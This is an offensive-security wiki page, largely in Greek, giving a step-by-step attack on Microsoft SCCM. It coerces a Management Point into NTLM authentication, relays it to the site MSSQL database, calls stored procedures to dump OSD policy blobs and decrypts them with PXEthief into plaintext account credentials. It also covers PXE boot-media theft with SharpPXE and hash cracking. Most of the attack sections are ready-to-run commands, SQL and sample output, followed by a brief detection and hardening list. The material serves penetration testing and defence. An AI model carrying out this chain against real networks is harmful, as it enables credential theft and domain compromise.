# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Με τον εξαναγκασμό ενός **System Center Configuration Manager (SCCM) Management Point (MP)** να κάνει authentication μέσω SMB/RPC και με το **relaying** αυτού του NTLM μηχανικού λογαριασμού στη **site database (MSSQL)** αποκτάτε δικαιώματα `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Αυτοί οι ρόλοι σας επιτρέπουν να καλέσετε ένα σύνολο από stored procedures που αποκαλύπτουν policy blobs της **Operating System Deployment (OSD)** (διαπιστευτήρια Network Access Account, μεταβλητές Task-Sequence, κ.λπ.). Τα blobs είναι hex-encoded/encrypted αλλά μπορούν να αποκωδικοποιηθούν και να αποκρυπτογραφηθούν με **PXEthief**, αποφέροντας μυστικά σε απλό κείμενο.

Υψηλού επιπέδου αλυσίδα:
1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Εξαναγκάστε το MP χρησιμοποιώντας **PetitPotam**, PrinterBug, DFSCoerce, κ.λπ.
4. Μέσω του SOCKS proxy συνδεθείτε με `mssqlclient.py -windows-auth` ως ο relayed **<DOMAIN>\\<MP-host>$** λογαριασμός.
5. Execute:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
6. Αφαιρέστε το `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Μυστικά όπως `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, κ.λπ. ανακτώνται χωρίς να πειράξετε PXE ή clients.

---

## 1. Enumerating unauthenticated MP endpoints
Το MP ISAPI extension **GetAuth.dll** εκθέτει αρκετές παραμέτρους που δεν απαιτούν πιστοποίηση (εκτός αν ο site είναι PKI-only):

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Returns site signing cert public key + GUIDs of *x86* / *x64* **All Unknown Computers** devices. |
| `MPLIST` | Lists every Management-Point in the site. |
| `SITESIGNCERT` | Returns Primary-Site signing certificate (identify the site server without LDAP). |

Πιάστε τα GUIDs που θα λειτουργήσουν ως το **clientID** για μεταγενέστερα DB queries:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
## 2. Αναμετάδοση του λογαριασμού μηχανήματος MP στο MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Όταν ενεργοποιηθεί ο εξαναγκασμός, θα πρέπει να δείτε κάτι σαν:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Αναγνώριση πολιτικών OSD μέσω stored procedures
Συνδεθείτε μέσω του SOCKS proxy (port 1080 by default):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Μεταβείτε στη βάση δεδομένων **CM_<SiteCode>** (χρησιμοποιήστε τον τριψήφιο κωδικό site, π.χ. `CM_001`).

### 3.1  Βρείτε Unknown-Computer GUIDs (προαιρετικό)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Λίστα εκχωρημένων πολιτικών
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Κάθε γραμμή περιέχει `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Εστιάστε στις πολιτικές:
* **NAAConfig**  – διαπιστευτήρια Network Access Account
* **TS_Sequence** – Task Sequence μεταβλητές (OSDJoinAccount/Password)
* **CollectionSettings** – Μπορεί να περιέχει run-as accounts

### 3.3  Ανάκτηση ολόκληρου `Body`
Αν έχετε ήδη `PolicyID` & `PolicyVersion`, μπορείτε να παρακάμψετε την απαίτηση clientID χρησιμοποιώντας:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> ΣΗΜΑΝΤΙΚΟ: Στο SSMS αυξήστε το “Maximum Characters Retrieved” (>65535) αλλιώς το blob θα περικοπεί.

---

## 4. Αποκωδικοποίηση & αποκρυπτογράφηση του blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Παράδειγμα ανακτημένων μυστικών:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Σχετικοί SQL ρόλοι & διαδικασίες
Κατά την relay, το login αντιστοιχίζεται σε:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Αυτοί οι ρόλοι εκθέτουν δεκάδες δικαιώματα EXEC, τα βασικά που χρησιμοποιούνται σε αυτή την attack είναι:

| Αποθηκευμένη Διαδικασία | Σκοπός |
|------------------------|--------|
| `MP_GetMachinePolicyAssignments` | Λίστα πολιτικών που εφαρμόζονται σε ένα `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Επιστρέφει το πλήρες σώμα της πολιτικής. |
| `MP_GetListOfMPsInSiteOSD` | Επιστρέφεται από το path `MPKEYINFORMATIONMEDIA`. |

Μπορείτε να ελέγξετε την πλήρη λίστα με:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Συλλογή μέσων εκκίνησης PXE (SharpPXE)
* **PXE reply over UDP/4011**: στείλτε ένα PXE boot request σε έναν Distribution Point ρυθμισμένο για PXE. Η απάντηση proxyDHCP αποκαλύπτει διαδρομές εκκίνησης όπως `SMSBoot\\x64\\pxe\\variables.dat` (κρυπτογραφημένη ρύθμιση) και `SMSBoot\\x64\\pxe\\boot.bcd`, καθώς και ένα προαιρετικό κρυπτογραφημένο blob κλειδιού.
* **Retrieve boot artifacts via TFTP**: χρησιμοποιήστε τις επιστρεφόμενες διαδρομές για να κατεβάσετε το `variables.dat` μέσω TFTP (χωρίς authentication). Το αρχείο είναι μικρό (λίγα KB) και περιέχει τις κρυπτογραφημένες μεταβλητές μέσων.
* **Decrypt or crack**:
- Εάν η απάντηση περιλαμβάνει το decryption key, δώστε το στο **SharpPXE** για να αποκρυπτογραφήσετε απευθείας το `variables.dat`.
- Εάν δεν παρέχεται κλειδί (PXE media προστατευμένα με custom password), το SharpPXE εξάγει ένα **Hashcat-compatible** `$sccm$aes128$...` hash για offline cracking. Μετά την ανάκτηση του password, αποκρυπτογραφήστε το αρχείο.
* **Parse decrypted XML**: οι plaintext μεταβλητές περιέχουν SCCM deployment metadata (**Management Point URL**, **Site Code**, GUIDs των μέσων και άλλους identifiers). Το SharpPXE τα αναλύει και εκτυπώνει μια έτοιμη προς εκτέλεση εντολή **SharpSCCM** με τα GUID/PFX/site παραμέτρους προ-συμπληρωμένα για επακόλουθη κατάχρηση.
* **Requirements**: μόνο δικτυακή προσβασιμότητα στον PXE listener (UDP/4011) και TFTP; δεν απαιτούνται τοπικά δικαιώματα admin.

---

## 7. Detection & Hardening
1. **Monitor MP logins** – οποιοσδήποτε λογαριασμός υπολογιστή MP που κάνει logon από IP που δεν είναι ο host του ≈ relay.
2. Ενεργοποιήστε **Extended Protection for Authentication (EPA)** στη βάση δεδομένων του site (`PREVENT-14`).
3. Απενεργοποιήστε μη χρησιμοποιούμενο NTLM, επιβάλετε SMB signing, περιορίστε RPC (ίδιες μετριάσεις που χρησιμοποιούνται ενάντια σε `PetitPotam`/`PrinterBug`).
4. Σκληροποιήστε την επικοινωνία MP ↔ DB με IPSec / mutual-TLS.
5. **Constrain PXE exposure** – φιλτράρετε/κλειδώστε UDP/4011 και TFTP σε trusted VLANs, απαιτήστε PXE passwords, και ειδοποιήστε για TFTP downloads του `SMSBoot\\*\\pxe\\variables.dat`.

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## References
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
